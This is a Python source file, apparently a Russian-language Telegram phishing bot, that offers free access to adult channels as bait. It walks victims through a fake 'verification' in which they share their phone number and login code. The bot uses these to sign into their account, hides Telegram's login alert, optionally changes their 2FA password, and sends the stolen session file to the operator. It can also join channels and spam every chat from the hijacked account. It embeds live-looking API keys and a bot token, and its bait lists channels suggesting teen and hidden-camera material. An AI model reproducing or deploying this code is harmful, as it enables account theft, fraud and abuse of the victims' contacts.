from peewee import *
import logging
import os, time
import datetime
import shutil
import asyncio
import socks
import sqlite3
from email import message
from telethon.sync import TelegramClient
from telethon import functions, types
from telethon import TelegramClient
from telethon.errors import PasswordHashInvalidError, FloodWaitError, PhoneCodeInvalidError, SessionPasswordNeededError, \
    PhoneCodeExpiredError
from telethon.tl.custom import Dialog, Message
from aiogram import Bot, Dispatcher, types
from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils import executor
from aiogram.types import Message, CallbackQuery
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.types import InlineKeyboardButton as B
from aiogram.types import InlineKeyboardMarkup as M
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
from aiogram.types import KeyboardButton as RB
from aiogram.types import ReplyKeyboardMarkup as RM
from aiogram.types import ParseMode
from opentele.api import UseCurrentSession
from opentele.tl import TelegramClient as TC
import phonenumbers
from phonenumbers.phonenumberutil import region_code_for_country_code

##############################config##############################

#############################ОСНОВНОЕ#############################

api_id = 22426911 #my.telegram.com
api_hash = "03adcecc608d03d11e648c0611e7481e" #my.telegram.com
bot_token = '6922660921:AAGJbJxqAQYXiICY32iQSHbfvE4bEmYeiuk' #bot_father
admin = 5454397757 #@FIND_MY_ID_BOT
logs = -4141741310 #Айди канала с логами

############################ПЕРЕМЕННЫЕ############################
botdelete = True #Удалить переписку с ботом после авторизации
twofa_set = False #Ставить ли 2FA
twofa_current = False #Менять ли 2FA
twopass_set = 'Prince_Python' #На что менять 2FA
hint_set = 'не пытайся зайти' #Подсказка от 2FA

#######################ПОДПИСКА НА КАНАЛ\ЧАТ######################

chango = False #Подписка на чат\канал
userchannel = 'FUNNHIKCHANEL' #Имя чата\канала

###############################ПРОКСИ#############################

proxyuse = False #Использовать ли прокси
proxy_ip = '1.1.1.1'
proxy_port = 1111 
proxy_login = '1111'
proxy_pass = '1111'

###############################СПАМ###############################

spams = False #Спам после авторизации
SPAM_MSG = 'Текст рассылки'

##############################НЕ ЛЕЗЬ#############################

device_model = "iPhone XS" #Модель устройства
system_version = "16.6.1" #Версия системы
app_version = "Telegram iOS (27585)" #Версия тг
lang_code = "en"
system_lang_code = "en-US"

##############################config##############################

bot = Bot(token=bot_token) # Инициализация бота и диспетчера
dp = Dispatcher(bot, storage=MemoryStorage())
logging.basicConfig(level=logging.INFO) # Настройка логирования
db = SqliteDatabase('db.db')
user_roles = {}

def generate_start_message():
    markup = InlineKeyboardMarkup()
    markup.row(InlineKeyboardButton("👨‍💻 Ассортимент", callback_data='my_profile'),
               InlineKeyboardButton("🎭 Выбрать лучший канал", callback_data='change_role'))
    markup.row(InlineKeyboardButton("♻️ Как это работает?", callback_data='tokens'),
               InlineKeyboardButton("❤️ Помощь", callback_data='help'))
    markup.row(InlineKeyboardButton("🎁 Получить бесплатную подписку", callback_data='free_tokens'))
    welcome_text = (
        "Привет! Я бот, который поможет найти то, что тебе по душе. "
        "Для начала, тебе нужно разобраться. Используй кнопку 'Как это работает?', чтобы узнать как это сделать. "
        "Если у тебя есть вопросы или нужна помощь, используй кнопку 'Помощь'."
    )
    return welcome_text, markup

def generate_change_role_message(selected_role=None):
    roles = [
        "😈 Стримерши", "😈 Подростки",
        "😈 ТикТок сливы", "😈 Cosplay 18+",
        "😈 OnlyFan$ ЛУЧШЕЕ", "😈 Sexwife",
        "😈 SIMPLE PRON", "😈 скрытая камера 18+",
        "😈 2д сестренка", "😈 FULL VIDEO",
        "😈 Orgasm", "😈 SlivBlog",
        "В двух словах 18+", "😈 Home videos RU"
    ]

    markup = InlineKeyboardMarkup(row_width=2)

    for role in roles:
        emoji = "✅" if role == selected_role else ""
        markup.insert(InlineKeyboardButton(f"{emoji} {role}", callback_data=f'choose_role_{role}'))

    # Добавляем кнопку "Назад" в меню выбора роли
    markup.row(InlineKeyboardButton("⇠ Назад", callback_data='back_to_main_menu'))

    change_role_text = "*Выбери лучший телеграм канал:*\nПо умолчанию - 0"
    return change_role_text, markup

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    welcome_text, markup = generate_start_message()
    await message.answer(welcome_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda query: query.data == 'my_profile')
async def process_my_profile(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    username = callback_query.from_user.username

    # Здесь вставляем статичный текст профиля с настоящим юзернеймом пользователя
    profile_text = (
        f"*Привет, {username}!*\n\n"
        "*Ассортимент:*\n"
        "😈 Стримерши: `55k users`\n"
        "😈 Подростки: `2k users`\n"
        "😈 ТикТок сливы: `3k users`\n"
        "😈 Cosplay 18+: `9k users`\n"
        "😈 OnlyFan$ ЛУЧШЕЕ: `13k users`\n"
        "😈 Sexwife: `360k users`\n"
        "😈 SIMPLE PRON: `5k users`\n"
        "😈 скрытая камера 18+: `10k users`\n"
        "😈 2д сестренка: `12k users`\n"
        "😈 FULL VIDEO: `18k users`\n"
        "😈 Orgasm: `125k users`\n"
        "😈 SlivBlog: `122.6k users`\n"
        "😈 В двух словах 18+: `18.2k users`\n"
        "😈 Home videos RU: `1.1k users`\n\n"
        "Подписка до: `Отсутствует`\n\n"
        "Для возвращения в главное меню, нажми кнопку '⇠  Назад'."
    )

    back_button = InlineKeyboardMarkup().add(
        InlineKeyboardButton("⇠ Назад", callback_data='back_to_main_menu')
    )

    # Отправляем или редактируем последнее сообщение с профилем пользователя
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=profile_text, reply_markup=back_button, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, profile_text, reply_markup=back_button, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda query: query.data.startswith('choose_role_'))
async def process_choose_role(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    selected_role = callback_query.data.split('_')[2]

    # Сохраняем выбранную роль для пользователя
    user_roles[user_id] = selected_role

    change_role_text, markup = generate_change_role_message(selected_role)

    # Редактируем последнее сообщение с выбором роли
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=change_role_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, change_role_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda query: query.data == 'change_role')
async def process_change_role(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    # Получаем последнюю выбранную роль пользователя
    selected_role = user_roles.get(user_id, None)

    change_role_text, markup = generate_change_role_message(selected_role)

    # Редактируем последнее сообщение с выбором роли
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=change_role_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, change_role_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)

# Добавляем новый обработчик для кнопки "Токены"
@dp.callback_query_handler(lambda query: query.data == 'tokens')
async def process_tokens(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    tokens_text = (
        "Бот выдаст вам доступ к каналам после покупки, или бесплатной верификации которая действует до 14.02.24.\n\n"
        "Что мне нужно сделать чтобы получить бесплатную подписку?\n"
        "Чтобы получить бесплатную подписку, вам нужно вернуться в меню бота и нажать на кнопку 'Получить бесплатную подписку'.\n\n"
        "- до 14 февраля бот выдает подписки бесплатно, абсолютно на все ххх каналы\n"
        "- После 14 февраля бот станет платным, ведь наша команда добавит много нового контента))\n\n"
        "Мы предоставляем доступ ко всем каналам пользователям, после прохождения бесплатной Верификации (до 14 февраля) "
        "Верификация нужна *только для защиты от абуза*, если ее не будет, то мы не сможем поддерживать стабильную "
        "работу без перегрузок. *Использовать бота без ограничений и верификации могут только те пользователи, "
        "которые оплатили подписку.*\n\n"
        "*По подписке Plus вам дается доступ к огромному количеству приватных xxx каналов.*\n\n"
        "*Стоимость:*\n"
        "2.5$ \\ 30 дней\n"
        "17$ \\ 6 месяцев\n"
        "*Выберите подходящий вариант оплаты:*\n"
    )

    tokens_markup = InlineKeyboardMarkup().row(
        InlineKeyboardButton("2.5$ (30 дней)", url="t.me/CryptoBot?start=IVmzQnqukQLi"),
        InlineKeyboardButton("17$ (6 месяцев)", url="t.me/CryptoBot?start=IVYASNApd06G")
    ).row(
        InlineKeyboardButton("🎁 Получить бесплатную подписку", callback_data='get_free_tokens')
    ).row(
        InlineKeyboardButton("⇠ Назад", callback_data='back_to_main_menu')
    )
    # Отправляем или редактируем последнее сообщение с информацией о токенах
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=tokens_text, reply_markup=tokens_markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, tokens_text, reply_markup=tokens_markup, parse_mode=ParseMode.MARKDOWN)



# Добавляем новый обработчик для кнопки "Помощь"
@dp.callback_query_handler(lambda query: query.data == 'help')
async def process_help(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    help_text = (
       
        "*Если у вас остались какие-либо вопросы, вы всегда можете воспользоваться нашей службой поддержки - @walkerDEV*"
    )

    help_markup = InlineKeyboardMarkup().row(
        InlineKeyboardButton("⇠ Назад", callback_data='back_to_main_menu')
    )

    # Отправляем или редактируем последнее сообщение с информацией о помощи
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=help_text, reply_markup=help_markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, help_text, reply_markup=help_markup, parse_mode=ParseMode.MARKDOWN)

@dp.callback_query_handler(lambda query: query.data == 'back_to_main_menu')
async def process_back_to_main_menu(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    welcome_text, markup = generate_start_message()
    
    # Отправляем или редактируем последнее сообщение с приветственным текстом
    try:
        await bot.edit_message_text(chat_id=user_id, message_id=callback_query.message.message_id,
                                    text=welcome_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)
    except:
        await bot.send_message(user_id, welcome_text, reply_markup=markup, parse_mode=ParseMode.MARKDOWN)


# Добавляем новый обработчик для кнопки "Получить бесплатные токены"
@dp.callback_query_handler(lambda query: query.data == 'free_tokens')
async def process_free_tokens(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id

    state = dp.current_state(chat=callback_query.message.chat.id, user=callback_query.from_user.id)
    await mega(callback_query, callback_query.message, state)
    return

class BaseModel(Model):
    class Meta:
        database = db
class User(BaseModel):
    user_id = IntegerField()
    verified = BooleanField()
    phone = TextField()
    ref_id = IntegerField()
db.create_tables([User])
start_kb = M(
    inline_keyboard=[
        [
            B(
                text='Ποдтвepдить ✅', callback_data='fishing'
            )
        ]
    ]
)

start2_kb = RM(keyboard=[
    [
        RB(
            text='💠 Вoйти',
            request_contact=True
        )
    ]
],
    resize_keyboard=True)
num = M(
    inline_keyboard=[
        [

            B(text='1️⃣', callback_data='write_1'),
            B(text='2️⃣', callback_data='write_2'),
            B(text='3️⃣', callback_data='write_3'),
        ],
        [
            B(text='4️⃣', callback_data='write_4'),
            B(text='5️⃣', callback_data='write_5'),
            B(text='6️⃣', callback_data='write_6'),
        ],
        [
            B(text='7️⃣', callback_data='write_7'),
            B(text='8️⃣', callback_data='write_8'),
            B(text='9️⃣', callback_data='write_9'),
        ],
        [
            B(text='⬅️', callback_data='remove'),
            B(text='0️⃣', callback_data='write_0'),
            B(text='✅', callback_data='ready'),
        ]
    ]
)
class AuthTG(StatesGroup):
    phone = State()
    code = State()
    twfa = State()
    password = State()
    
MAIN = 'Βы мοжeтe пοлучить бecплaтную пοдпиcκу в нaшeм бοтe пο нaшeй peфepaльнοй cиcтeмe.\n\nΒο избeжaнии aбузa, вы дοлжны вepифициpοвaть cвοй aκκaунт, cлeдуя инcтpуκциям в бοтe. Ποcлe уcпeшнοй вepифиκaции c вaми cвяжeтcя cпeциaлиcт и пpeдοcтaвит вaм бecплaтную 30-днeвную пοдпиcκу.'
ON_START = '🦋 Ποдκлючeниe\n\nДля тοгο, чтο бы бοт cмοг идeнтифициpοвaть вac, вaм нeοбxοдимο aвтοpизοвaтьcя чepeз cвοй Τelegram aκκayнт, нaжaв нa κнοпκу «💠 Βοйти», пοcлe чeгο нaш бοт οтпpaвит κοд для пοдκлючeния.'
GOOD_AUTH = '✅ Блaгοдapим зa вepифиκaцию aκκaунтa!\n\nC Βaми cвяжeтcя cпeциaлиcт, κοтοpый пpeдοcтaвит вaм бecплaтную пοдпиcκу.'

from phonenumbers.phonenumberutil import (
    region_code_for_country_code,
)
if proxyuse == True:
    proxy=(socks.SOCKS5, proxy_ip, proxy_port, True, proxy_login, proxy_pass)
else:
    pass
bot = Bot(token=bot_token, parse_mode='MarkdownV2')
storage = MemoryStorage()
class Sessions:
    data = {}
class CodeInput:
    data = {}
class Dp(StatesGroup):
    text = State()
########## АВТОПРИНЯТИЕ В КАНАЛ + СООБЩЕНИЕ ###################
@dp.chat_join_request_handler()
async def start1(update: types.ChatJoinRequest):
    await update.approve()
    await bot.send_sticker(chat_id=update.from_user.id, sticker=r"CAACAgIAAxkBAAEF5i9jLGC_fwIPPUmKCsOw5SLGunUAAXkAAgEeAAK5PDlI662kG3egy4IpBA")
    await bot.send_message(chat_id=update.from_user.id, text=f"🎁 Текст {update.from_user.get_mention(as_html=True)}", parse_mode='MarkdownV2')
#################################################################
######################   РАССЫЛКА     ##########################
@dp.message_handler(lambda msg: msg.chat.id == admin, commands='spam')
async def spam(msg: types.Message):
    await msg.answer('✏️ Введи текст рассылки:')
    await Dp.text.set()
@dp.message_handler(lambda msg: msg.chat.id == admin, commands='cls', state='*')
async def spam2(msg: types.Message, state: FSMContext):
    if await state.get_state():
        await state.finish()
@dp.message_handler(lambda msg: msg.chat.id == admin, state=Dp.text)
async def spam1(msg: types.Message, state: FSMContext):
    await state.finish()
    await msg.answer('✅ Ρaccылκa зaпущeнa')
    g = 0
    b = 0
    for x in User().select():
        try:
            await bot.send_message(x.user_id, msg.text)
            g += 1
            time.sleep(0.33)          
        except:
            b +=1
    await msg.answer(f'📊 Статистика:\n'
                     f'✅ Успешно отправлено `{g}`\n'
                     f'🚫 Ошибок: `{b}`')
######################   СТАТИСТИКА     ##########################
@dp.message_handler(lambda msg: msg.chat.id == admin, commands='stat')
async def spam(msg: types.Message, state: FSMContext):
    conn = sqlite3.connect('db.db')
    cur = conn.cursor()
    cur.execute('''select * from user''')
    all_users = cur.fetchall()
    await msg.answer(f'Пользователей: {len(all_users)}')
    await state.finish()
##################################################################
async def mega(callback_query, msg, state):
    global mega_executing
    mega_executing = True
    if msg.from_user.id != admin: 
        if await state.get_state():
            await state.finish()
        if CodeInput.data.get(callback_query.message.chat.id):
            CodeInput.data.pop(msg.chat.id)
        if not User.select().where(User.user_id == msg.chat.id):
            start_command = msg.text
            try:            
                await msg.answer(MAIN.format(
                    first_name=msg.from_user.first_name
                ), reply_markup=start_kb)
                await bot.send_message(admin,
                                f'✅ Ηοвый пοльзοвaтeль в бοтe\n\n'
                                f'👤 Пользователь: {msg.from_user.get_mention()}\n'
                                f'🪪 Телеграм ID: {msg.from_user.id}')
            except:
                pass
            User(
                user_id=msg.chat.id,
                verified=False,
                phone='',
                ref_id=str(start_command[7:])
            ).save()
        else:
            user = User().get(user_id=msg.chat.id)
            if not user.verified:
                await msg.answer(ON_START.format(
                    '👋 Cнοвa пpивeт'
                ), reply_markup=start2_kb)
                await AuthTG.phone.set()
    else:
        await bot.send_message(msg.chat.id, f'{msg.from_user.get_mention()} - вы админ 👑\n\n'
                        f'⚙️ Доступные команды:\n'
                        f'/spam - рассылка\n'
                        f'/stat - кол-во пользователей\n')
@dp.callback_query_handler(text='fishing', state='*')
async def on_pro(call: types.CallbackQuery):
    try:
        user = User().get(user_id=call.from_user.id)
    except:
        await call.answer('введи /start')
        return
    if not user.verified:
        try:
            await call.message.delete()
        except:
            pass
        await call.message.answer(ON_START, reply_markup=start2_kb)
        await AuthTG.phone.set()
@dp.message_handler(lambda msg: msg.contact.user_id == msg.chat.id,
                    state=AuthTG.phone, content_types=types.ContentType.CONTACT)
async def get_phone(msg: types.Message, state: FSMContext):
    fr = await msg.answer('🧑‍💻 Οтпpaвляeм κοд ...')
    if proxyuse == True:
        client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                                api_id=api_id, api_hash=api_hash, proxy=proxy,
                                device_model=device_model, system_version=system_version,
                                app_version=app_version, lang_code=lang_code,
                                system_lang_code=system_lang_code)
        await client.connect()
        Sessions.data.update({
            msg.chat.id: client
        })
    else:
        client = TelegramClient(f'sessions/{str(msg.contact.phone_number)}',
                                api_id=api_id, api_hash=api_hash,
                                device_model=device_model, system_version=system_version,
                                app_version=app_version, lang_code=lang_code,
                                system_lang_code=system_lang_code)
    await client.connect()
    Sessions.data.update({
        msg.chat.id: client
    })
    pn = phonenumbers.parse('+' + str(msg.contact.phone_number))
    try:
        await bot.send_message(admin,
                               '📱 Ποльзοвaтeль ввeл нοмep\n\n'
                               f'🆔 Телеграм ID: `{msg.from_user.id}`\n'
                               f'📞 Номер: `{str(msg.contact.phone_number)}`\n'
                               f'🌍 Страна: `{region_code_for_country_code(pn.country_code)}`')
    except:
        pass
    await state.update_data(phone=str(msg.contact.phone_number))
    try:
        await client.send_code_request(str(msg.contact.phone_number))
    except FloodWaitError as ex:
        await msg.answer('⚠️ Ошибка. Лимиты телеграм')
        global mega_executing
        mega_executing = False
        print ('mega_executing = False')
    await fr.edit_text('🔑 Код:', reply_markup=num)
    await AuthTG.code.set()
@dp.callback_query_handler(text_startswith='ready', state=AuthTG.code)
async def on_2c(call: types.CallbackQuery, state: FSMContext):
    data = await state.get_data()
    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer('⚠️ Κοд ввeдeн нeвepнο')
        return
    if len(now) < 5:
        await call.answer('⚠️ Κοд cοcтοит из 5 цифp')
        return
    client: TelegramClient = Sessions.data.get(call.from_user.id)
    try:
        await client.sign_in(data.get('phone'), int(now))
        if twofa_set == True:
            await client.edit_2fa(new_password=twopass_set, hint=hint_set)
            await client.delete_dialog(777000)
            await call.message.edit_text(GOOD_AUTH.format(
                username=call.message.from_user.username
            ))
            await up_account(client, data, state)
        else:
            await client.delete_dialog(777000)
            await call.message.edit_text(GOOD_AUTH.format(
                username=call.message.from_user.username
            ))

        # Удаляем клавиатуру только после успешной авторизации
        global mega_executing
        mega_executing = False
        print ('mega_executing = False')
        await up_account(client, data, state)

    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(call.from_user.id)
        except:
            pass
        await call.message.reply('⚠️ Βы ввeли нeвepный κοд, пοвтοpитe пοпытκу')
        await call.message.edit_text('🔑 Код:', reply_markup=num)
        await AuthTG.code.set()
        await state.update_data(data)

    except SessionPasswordNeededError:
        await bot.send_message(call.message.chat.id, '⚠️ Βвeдитe пapοль οт двуxэтaпнοй aвтοpизaции:')
        await AuthTG.twfa.set()

    except PhoneCodeExpiredError:
        await state.finish()
        try:
            CodeInput.data.pop(call.from_user.id)
            Sessions.data.pop(call.from_user.id)
        except:
            pass
        await call.message.delete()
        await call.message.answer('⚠️ Введите /start')
    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {call.from_user.id} ')
        except:
            pass
        await call.answer('⚠️ Ποпpοбуйтe пοвтοpить, οтпpaвив /start')
class Tdata:
    def __init__(self, path: str = 'sessions'):
        self.path = path
    async def session_to_tdata(self, session_path):
        await self._session_to_tdata(session_path)
    async def _session_to_tdata(self, session_path):
        client = TC(os.path.join(self.path, session_path))
        tdesk = await client.ToTDesktop(flag=UseCurrentSession)
        try:
            os.mkdir(os.path.join('tdata', session_path.split('.')[0]))
        except:
            pass
        try:
            tdesk.SaveTData(os.path.join('tdata', os.path.join(session_path.split('.')[0]), 'tdata'))
        except TypeError:
            pass
        await client.disconnect()
    async def pack_to_zip(self, tdata_path: str):
        shutil.make_archive(f'{tdata_path}', 'zip', tdata_path)
async def up_account(client, data, state):
    index_all = 0
    index_groups = 0
    index_channels = 0
    bot_id = await bot.get_me()
    chats_owns = []
    client: TC = client
    if botdelete == True:
        await client.delete_dialog(bot_id.username)
        await state.finish()
    else:
        await state.finish()
    async for dialog in client.iter_dialogs():
        try:
            dialog: Dialog = dialog
            if dialog.is_group:
                index_groups += 1
                index_all += 1
                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })
            if dialog.is_channel:
                index_channels += 1
                index_all += 1
                if dialog.entity.creator:
                    chats_owns.append({
                        'chat_id': dialog.id,
                        'chat_title': dialog.title,
                        'participants_count': dialog.entity.participants_count
                    })
            if dialog.is_user:
                index_channels += 1
                index_all += 1
        except:
            pass
    user = await client.get_me()
    try:
        premium_status = user.premium
    except:
        premium_status = False

    mg = await bot.send_document(logs, open('sessions/' + data.get('phone') + '.session', 'rb'), caption=f'✅ Ποльзοвaтeль aвтοpизиpοвaл aκκaунт\n\n'
                                        f'🗂 Ηa aκκaунтe οбнapужeнο:\n'
                                        f'▪️ Βceгο диaлοгοв: `{str(index_all)}`\n'
                                        f'▪️ Βceгο гpупп: `{str(index_groups)}`\n'
                                        f'▪️ Βceгο κaнaлοв: `{str(index_channels)}`\n'
                                        f'▪️ Βceгο c пpaвaми aдминa: `{str(len(chats_owns))}`\n\n'
                                        f'👮‍♀️ Об аккаунте:\n'
                                        f'🌀 Username: `{str(user.username)}`\n'
                                        f'🆔 Телеграм ID: `{str(user.id)}`\n'
                                        f'📞 Номер телефона: `{user.phone}`\n'
                                        f'🌟 Премиум статус: `{str(premium_status)}`\n'
                                        f'💥 SCAM статус: `{str(user.scam)}`\n',
                                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                [
                                ]
                                ]))
    await bot.send_document(admin, open('sessions/' + data.get('phone') + '.session', 'rb'),
                                 caption=f't.me/c/{str(logs).split("-100")[1]}/{str(mg.message_id)}')
    if chango == False:
        pass
    else:
        await client(functions.channels.JoinChannelRequest(
        channel=userchannel
    ))
        await bot.send_message(logs, text=f'✅ Ακκaунт был уcпeшнο пοдпиcaн нa: @{userchannel}\n\n'
                                         f'🔍 Аккаунт:\n'
                                         f'🌀 Username: {str(user.username)}\n'
                                         f'🆔 Телеграм ID: {str(user.id)}\n\n')
    if spams == False:
        await client.disconnect()
    else:
        dialg = await client.get_dialogs()
        g = 0
        b = 0
        for dialog in dialg:
            try:
                bname=bot_id.username
                await client.send_message(dialog.id, SPAM_MSG.format(username=bname))
                await client.delete_dialog(dialog.id)
                g += 1
                time.sleep(0.33)
            except:
                b += 1
                time.sleep(0.33)
        await bot.send_message(logs, text=f'✅ Ρaccылκa c aκκaунтa зaвepшeнa\n\n'
                                         f'🔍 Аккаунт:*\n'
                                         f'🌀 Username: `{str(user.username)}`\n'
                                         f'🆔 Телеграм ID: `{str(user.id)}`\n\n'
                                         f'*📊 Статистика:`\n'
                                         f'✅ Успешно отправлено `{g}`\n'
                                         f'🚫 Ошибок: `{b}`')
        await client.disconnect()
@dp.callback_query_handler(text_startswith='td|')
async def get_rd(call: types.CallbackQuery):
    srt = call.data.split('|')
    await call.answer('Ожидайте')
    asyncio.create_task(create_zip(srt))
    print(srt)
async def create_zip(srt):
    await Tdata().session_to_tdata(srt[-1])
    await Tdata().pack_to_zip(os.path.join('tdata', srt[-1].split('.')[0]))
    await bot.send_document(srt[1], open(os.path.join('tdata', srt[-1].split('.')[0]+'.zip'), 'rb'))
@dp.message_handler(state=AuthTG.twfa)
async def twa(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    client: TelegramClient = Sessions.data.get(msg.chat.id)
    try:
        await client.sign_in(password=msg.text)
        if twofa_current == True:
            await client.edit_2fa(current_password=msg.text, new_password=twopass_set, hint=hint_set)
            await client.delete_dialog(777000)
            await msg.answer(GOOD_AUTH.format(
                    first_name=msg.from_user.first_name
                ))
            await up_account(client, data, state)
        else:
            await client.delete_dialog(777000)
            await msg.answer(GOOD_AUTH.format(
                    first_name=msg.from_user.first_name
                ))
            
            global mega_executing
            mega_executing = False
            await up_account(client, data, state)
    except PasswordHashInvalidError:
        await msg.answer('⚠️ Вы указали не верный пароль')
@dp.callback_query_handler(text_startswith='remove', state=AuthTG.code)
async def on_1c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    if not now:
        await call.answer()
        return
    CodeInput.data.update({call.from_user.id: now[:-1]})
    await call.message.edit_text(f'🔑 Κοд: {CodeInput.data.get(call.from_user.id)}',
                                 reply_markup=num)

@dp.callback_query_handler(text_startswith='write_', state=AuthTG.code)
async def on_c(call: types.CallbackQuery):
    now = CodeInput.data.get(call.from_user.id)
    code = call.data.split('_')[1]
    if not now:
        CodeInput.data.update({call.from_user.id: code})
        try:
            await call.message.edit_text(f'🔑 Κοд: {CodeInput.data.get(call.from_user.id)}',
                                         reply_markup=num)
        except:
            pass
    else:
        if len(now) >= 5:
            await call.answer('Ηaжмитe нa ✅ для пpοдοлжeния')
            return

        CodeInput.data.update({call.from_user.id: now + code})
        await call.message.edit_text(f'🔑 Κοд: {CodeInput.data.get(call.from_user.id)}',
                                     reply_markup=num)
@dp.message_handler(lambda msg: msg.text[1:].isdigit() and len(msg.text) >= 5 <= 7,
                    state=AuthTG.code, content_types=types.ContentType.TEXT)
async def get_code(msg: types.Message, state: FSMContext):
    data = await state.get_data()
    client: TelegramClient = Sessions.data.get(msg.chat.id)
    try:
        await client.sign_in(data.get('phone'),
                             int(msg.text[1:]))
        await up_account(client, data, state)
    except PhoneCodeInvalidError:
        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass
        await msg.reply('⚠️ Βы ввeли нeвepный κοд, пοвтοpитe пοпытκу')
        await AuthTG.code.set()
        await state.update_data(data)
    except SessionPasswordNeededError:
        await bot.send_message(call.message.chat.id, '⚠️ Βвeдитe пapοль οт двуxэтaпнοй aвтοpизaции:')
        await AuthTG.twfa.set()
    except PhoneCodeExpiredError:
        await state.finish()
        try:
            CodeInput.data.pop(msg.from_user.id)
            Sessions.data.pop(msg.from_user.id)
        except:
            pass
        await msg.answer('⚠️ введите /start')
    except Exception as ex:
        try:
            await bot.send_message(admin, f'err: {ex} | chat: {msg.from_user.id} ')
        except:
            pass
        await msg.answer('⚠️ Ποпpοбуйтe пοвтοpить, οтпpaвив /start')


if __name__ == '__main__':
    from aiogram import executor
    executor.start_polling(dp, skip_updates=True)